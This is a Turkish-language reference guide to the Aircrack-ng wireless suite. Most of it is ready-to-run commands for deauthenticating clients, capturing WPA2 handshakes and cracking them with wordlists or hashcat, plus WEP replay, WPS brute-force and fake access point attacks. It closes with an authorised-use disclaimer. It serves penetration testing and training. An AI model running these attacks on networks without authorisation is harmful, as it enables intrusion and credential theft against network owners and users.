[🇬🇧 English](../../README.md)

# 📶 Aircrack-ng - WiFi Güvenlik & Kırma Paketi Başvuru Kılavuzu

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    WiFi Hacking Suite
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

---

## 📋 İçindekiler

- [Aircrack-ng Nedir](#-aircrack-ng-nedir)
- [Kurulum](#-kurulum)
- [Monitör Modu](#-monitör-modu)
- [Keşif ve Dinleme (airodump-ng)](#-keşif-ve-dinleme-airodump-ng)
- [Bağlantı Kesme Saldırısı (aireplay-ng)](#-bağlantı-kesme-saldırısı-aireplay-ng)
- [WPA/WPA2 Kırma](#-wpawpa2-kırma)
- [WEP Kırma](#-wep-kırma)
- [WPS Saldırıları](#-wps-saldırıları)
- [Ek Araçlar](#-ek-araçlar)
- [Eksiksiz Saldırı İş Akışı](#-eksiksiz-saldırı-i̇ş-akışı)
- [Hızlı Referans](#-hızlı-referans)

---

## 🎯 Aircrack-ng Nedir

**Aircrack-ng**, WiFi kablosuz ağ güvenliği değerlendirmesi ve denetimi için geliştirilmiş eksiksiz bir araç takımıdır. Şunları içerir:

- 📡 **airodump-ng** - Paket yakalama ve kablosuz ağ tespiti
- 💥 **aireplay-ng** - Paket enjeksiyonu ve deauthentication (bağlantı koparma) saldırıları
- 🔓 **aircrack-ng** - WEP ve WPA/WPA2 anahtar kırıcı
- 🔧 **airmon-ng** - Monitör modunu etkinleştirme/devre dışı bırakma
- 📝 **airodecap-ng** - Yakalanan şifreli kablosuz trafiği deşifre etme

### Gereksinimler

| Gereksinim | Açıklama |
|------------|----------|
| **Kablosuz Ağ Kartı** | Monitör modunu ve paket enjeksiyonunu desteklemelidir |
| **Desteklenen Yonga Setleri** | Atheros, Ralink, Realtek (bazıları) |
| **İşletim Sistemi** | Linux önerilir (özellikle Kali Linux) |

### Popüler Uyumlu Adaptörler

| Adaptör Modeli | Yonga Seti (Chipset) | Notlar |
|----------------|----------------------|--------|
| Alfa AWUS036ACH | RTL8812AU | Çift bant (Dual-band), güçlü |
| Alfa AWUS036NHA | Atheros AR9271 | Klasik, son derece kararlı |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Fiyat/performans seçeneği (v1 olmalı) |

---

## 🚀 Kurulum

### Kali Linux (Önceden Yüklü)

```bash
# Zaten yüklüdür, sürümü kontrol edin
aircrack-ng --version

# Güncelleme
sudo apt update && sudo apt install aircrack-ng
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

### Kaynak Koddan Derleme

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

## 📡 Monitör Modu

### Kablosuz Arayüzü Kontrol Etme

```bash
# Kablosuz arayüzleri listeleme
iwconfig

# Veya
iw dev

# Veya
airmon-ng
```

### Monitör Modunu Etkinleştirme

```bash
# Yöntem 1: airmon-ng (önerilen)
sudo airmon-ng start wlan0

# Çıktı: wlan0mon üzerinde monitör modu etkinleştirildi

# Yöntem 2: Manuel
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Çakışan Süreçleri Sonlandırma

```bash
# Kablosuz kartı kullanan ve çakışabilecek süreçleri kapat
sudo airmon-ng check kill

# Veya elle
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

### Monitör Modunu Devre Dışı Bırakma

```bash
# Monitör modunu durdur
sudo airmon-ng stop wlan0mon

# Ağ yöneticisini yeniden başlat
sudo systemctl start NetworkManager
```

### Kanal Değiştirme

```bash
# Belirli bir kanala ayarlama
sudo iwconfig wlan0mon channel 6

# Veya airmon-ng ile
sudo airmon-ng start wlan0 6
```

---

## 🔍 Keşif ve Dinleme (airodump-ng)

### Temel Tarama

```bash
# Tüm çevre ağları tarama
sudo airodump-ng wlan0mon

# Çıktı:
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

### Belirli Bir Bandı Tarama

```bash
# Yalnızca 2.4GHz
sudo airodump-ng --band g wlan0mon

# Yalnızca 5GHz
sudo airodump-ng --band a wlan0mon

# Her iki bant (2.4GHz ve 5GHz)
sudo airodump-ng --band abg wlan0mon
```

### Belirli Bir Ağı Hedefleme

```bash
# Belirli kanal ve BSSID ile filtreleme
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Paket yakalamayı dosyaya kaydetme
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Oluşturulan dosyalar: capture-01.cap, capture-01.csv vb.
```

### Çıktıyı Anlama

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| Alan | Açıklama |
|------|----------|
| BSSID | Erişim Noktasının (AP) MAC adresi |
| PWR | Sinyal gücü (0'a ne kadar yakınsa o kadar güçlü) |
| Beacons | Gönderilen beacon çerçeve sayısı |
| #Data | Yakalanan veri paketleri sayısı |
| CH | Kanal numarası |
| ENC | Şifreleme türü (WPA2/WPA/WEP/OPN) |
| CIPHER | Kullanılan şifreleme algoritması (CCMP/AES veya TKIP) |
| AUTH | Kimlik doğrulama protokolü (PSK veya MGT) |
| ESSID | Ağ adı (SSID) |
| STATION | Bağlı olan istemcinin MAC adresi |

### Filtreleme Seçenekleri

```bash
# Yalnızca WPA2 şifreli ağları göster
sudo airodump-ng --encrypt wpa2 wlan0mon

# Yalnızca WEP ağları göster
sudo airodump-ng --encrypt wep wlan0mon

# Belirli bir ağ adına (ESSID) göre filtrele
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

## 💥 Bağlantı Kesme Saldırısı (aireplay-ng)

### Deauth Saldırısı Neden Yapılır?

Deauth saldırısı istemciyi ağdan kopararak yeniden bağlanmaya zorlar; böylece istemci ile AP arasındaki 4 aşamalı el sıkışma (4-way handshake) havadan yakalanabilir.

### Tek Bir İstemcinin Bağlantısını Kesme

```bash
# Belirli bir istemciyi hedefleyerek deauth gönderme
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Deauth saldırısı modu
# 5  : Gönderilecek deauth paketi sayısı (0 = sonsuz)
# -a : Erişim Noktası (AP) BSSID adresi
# -c : İstemcinin MAC adresi
```

### Tüm İstemcilerin Bağlantısını Kesme

```bash
# Broadcast deauth (tüm bağlı cihazlar için)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Sürekli ve agresif mod
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Handshake Yakalandığını Doğrulama

```
# airodump-ng ekranının sağ üst köşesinde şu ifade aranır:
WPA handshake: AA:BB:CC:DD:EE:FF
```

---

## 🔓 WPA/WPA2 Kırma

### Adım Adım WPA2 Saldırı Akışı

```bash
# 1. Adım: Monitör modunu başlat
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Adım: Ağları tara
sudo airodump-ng wlan0mon

# 3. Adım: Hedef ağı dinle ve paketleri yakala
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Adım: İstemciye deauth gönder (yeni bir terminalde)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 5. Adım: Handshake bildiriminin görünmesini bekle (airodump-ng ekranında)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# 6. Adım: Kelime listesiyle handshake'i kır
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Sözlük Saldırısı (Dictionary Attack)

```bash
# Standart kelime listesi ile kırma
aircrack-ng -w wordlist.txt capture-01.cap

# Rockyou listesi kullanarak kırma
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Birden fazla kelime listesi belirtme
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

### Hedef ESSID veya BSSID Belirtme

```bash
# Yakalama dosyasında birden fazla ağ varsa ESSID ile belirt
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# Veya BSSID ile belirt
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Hashcat ile GPU Üzerinde Kırma (Daha Hızlı)

```bash
# CAP dosyasını Hashcat formatına dönüştürme
aircrack-ng capture-01.cap -J hashcat_file
# Oluşan dosya: hashcat_file.hccapx

# Veya cap2hccapx aracı ile
cap2hccapx capture-01.cap hashcat_file.hccapx

# Hashcat ile kırma (yeni WPA2 modu 22000)
hashcat -m 22000 hashcat_file.hccapx wordlist.txt
```

### Dosya Biçimlerini Dönüştürme

```bash
# CAP formatını HCCAPX formatına dönüştürme
aircrack-ng capture-01.cap -j hashcat_output

# CAP dosyasını standart PCAP formatına çevirme
editcap capture-01.cap output.pcap

# Birden çok yakalama dosyasını birleştirme
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

## 🔐 WEP Kırma

> ⚠️ WEP protokolü günümüzde güvensiz ve kullanım dışıdır. Günümüz ağlarının büyük çoğunluğu WPA2/WPA3 kullanır.

### WEP Saldırı Türleri

| Saldırı | Açıklama |
|---------|----------|
| ARP Replay | ARP paketlerini yakalayıp yeniden göndererek IV üretme |
| Fake Auth | Parola olmadan AP ile sahte ilişkilendirme kurma |
| Fragmentation | PRGA (keystream) üretimi |
| ChopChop | Parolasız şekilde paket deşifre etme |

### Temel WEP Saldırısı

```bash
# 1. Adım: Trafiği yakala
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# 2. Adım: Sahte kimlik doğrulama yap
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <kendi_mac_adresiniz> wlan0mon

# 3. Adım: ARP yeniden çalma saldırısı başlat
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <kendi_mac_adresiniz> wlan0mon

# 4. Adım: Yeterli IV toplandığında (>50.000) şifreyi kır
sudo aircrack-ng wep_capture-01.cap
```

### aireplay-ng Saldırı Modları

| Mod | Açıklama |
|-----|----------|
| `-0` | Deauthentication (Bağlantı kesme) |
| `-1` | Fake authentication (Sahte kimlik doğrulama) |
| `-2` | Interactive packet replay (Etkileşimli paket tekrarı) |
| `-3` | ARP request replay (ARP istek tekrarı) |
| `-4` | KoreK chopchop saldırısı |
| `-5` | Fragmentation saldırısı |
| `-9` | Paket enjeksiyon testi |

---

## 🔓 WPS Saldırıları

### Reaver Kullanımı

```bash
# Reaver kurulumu
sudo apt install reaver

# Temel WPS kaba kuvvet saldırısı
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Kanal belirterek çalıştırma
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Pixie-Dust saldırısı (çevrimdışı ve çok daha hızlı)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

### Bully Kullanımı

```bash
# Bully kurulumu
sudo apt install bully

# Temel saldırı
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust modu
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### Wash (WPS Destekli Ağları Bulma)

```bash
# WPS açık ağları tarama
sudo wash -i wlan0mon

# Çıktı:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

## 🔧 Ek Araçlar

### airbase-ng (Sahte Erişim Noktası / Fake AP)

```bash
# Sahte AP oluşturma
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# Belirli bir BSSID adresi taklit ederek oluşturma
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### airdecap-ng (Yakalanan Paketleri Çözme)

```bash
# Bilinen WPA şifresiyle yakalama dosyasını çözme
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# WEP anahtarıyla çözme
airdecap-ng -w <wep_key> capture-01.cap
```

### aircrack-ng Ek Seçenekleri

```bash
# Tüm seçenekleri listele
aircrack-ng --help

# Çok çekirdekli CPU desteği (-p)
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Sessiz mod (Quiet)
aircrack-ng -q -w wordlist.txt capture-01.cap

# Hedef ESSID belirleme
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

### packetforge-ng (Özel Paket Üretimi)

```bash
# Sahte ARP paketi oluşturma
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

## 🎯 Eksiksiz Saldırı İş Akışı

### WPA2 Saldırısı (Adım Adım Uygulama)

```bash
# Terminal 1: Hazırlık
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Monitör modunu doğrula
iwconfig  # wlan0mon görünmelidir

# Terminal 1: Ağları tara
sudo airodump-ng wlan0mon
# Not alın: Hedefin BSSID, CH (Kanal) ve ESSID bilgileri

# Terminal 1: Hedefe kilitlen ve trafiği yakala
sudo airodump-ng -c <KANAL> --bssid <HEDEF_BSSID> -w handshake wlan0mon

# Terminal 2: Deauth saldırısı gönder
sudo aireplay-ng -0 5 -a <HEDEF_BSSID> -c <ISTEMCI_MAC> wlan0mon

# Terminal 1 ekranında "WPA handshake: XX:XX:XX:XX:XX:XX" ibaresini bekleyin
# Yakalama tamamlandığında Ctrl+C ile durdurun

# Terminal 1: Yakalanan el sıkışmayı kır
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Veya GPU ile daha hızlı kırmak için Hashcat kullanın:
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

### Saldırı Sonrası Temizlik

```bash
# Monitör modunu durdur
sudo airmon-ng stop wlan0mon

# Ağ yöneticisini yeniden başlat
sudo systemctl start NetworkManager

# Geçici yakalama dosyalarını temizleme (isteğe bağlı)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

## 📊 Hızlı Referans

### Temel Komutlar

| Amaç | Komut |
|------|-------|
| Monitör modunu başlat | `airmon-ng start wlan0` |
| Monitör modunu kapat | `airmon-ng stop wlan0mon` |
| Çakışan süreçleri öldür | `airmon-ng check kill` |
| Çevre ağları tara | `airodump-ng wlan0mon` |
| Hedef ağı dinle | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Bağlantı koparma (Deauth) | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| WPA parolasını kır | `aircrack-ng -w wordlist.txt capture.cap` |

### Saldırı Özeti

| Saldırı | Şifreleme | Yöntem |
|---------|-----------|--------|
| Sözlük Saldırısı | WPA/WPA2 | Handshake yakala → Kelime listesi ile kır |
| Reaver | WPS | WPS PIN kaba kuvvet saldırısı |
| Pixie-Dust | WPS | Çevrimdışı WPS PRNG istismarı |
| ARP Replay | WEP | IV topla → Matematiksel olarak şifreyi çöz |

### Sık Kullanılan Kelime Listeleri

| Dosya Yolu | Açıklama |
|------------|----------|
| `/usr/share/wordlists/rockyou.txt` | En yaygın kullanılan parola listesi (Kali) |
| `/usr/share/wordlists/fasttrack.txt` | Hızlı kontroller için kısa liste |
| `/usr/share/seclists/Passwords/` | Kapsamlı SecLists koleksiyonu |

### Sorun Giderme

```bash
# Kart monitör moduna geçmiyorsa
sudo rfkill unblock wifi
sudo rfkill unblock all

# Sürücünün paket enjeksiyonunu desteklediğini doğrula
sudo aireplay-ng -9 wlan0mon

# Handshake yakalanamıyorsa
# - Hedefe daha yakın bir konuma geçin
# - Başka istemcilere deauth gönderin
# - Daha fazla deauth paketi ile deneyin
# - İstemcinin aktif trafik üretmesini bekleyin

# Airmon "Found X processes" uyarısı veriyorsa
sudo airmon-ng check kill
```

---

## ⚠️ Yasal Uyarı

```
⚠️ UYARI: Bu araçları yalnızca SAHİBİ OLDUĞUNUZ veya güvenlik testi 
yapmak üzere AÇIK YAZILI İZİN ALDIĞINIZ ağlarda kullanın. Bilgisayar 
ağlarına yetkisiz erişim sağlamak çoğu ülkede yasa dışıdır ve cezai 
sorumluluk doğurur.

Sorumlu kullanım alanları:
✅ Güvenlik denetimleri ve analizleri
✅ Yasal ve izinli sızma testleri
✅ Eğitim amaçlı laboratuvar ortamları

Asla kullanmayın:
❌ Yetkisiz ağ erişimi sağlama
❌ Başkalarına ait kimlik bilgilerini çalma
❌ Kötü niyetli herhangi bir saldırı veya zarar verme
```

---

## 📚 Kaynaklar

- [Aircrack-ng Resmi Sitesi](https://www.aircrack-ng.org/)
- [Aircrack-ng Wiki Belgeleri](https://www.aircrack-ng.org/doku.php)
- [Hashcat WiFi Kılavuzu](https://hashcat.net/wiki/)

### İlgili Başvuru Kılavuzları
- [Hashcat](../../Hashcat/translations/README.tr.md)
- [Wireshark](../../Wireshark/translations/README.tr.md)
- [Linux Komutları](../../Linux-Commands/translations/README.tr.md)

---

<p align="center">
  <b>📶 WiFi Güvenlik Testlerinde Uzmanlaşın!</b><br>
  <i>Aircrack-ng - Kablosuz ağ sızma testlerinin vazgeçilmez aracı</i>
</p>
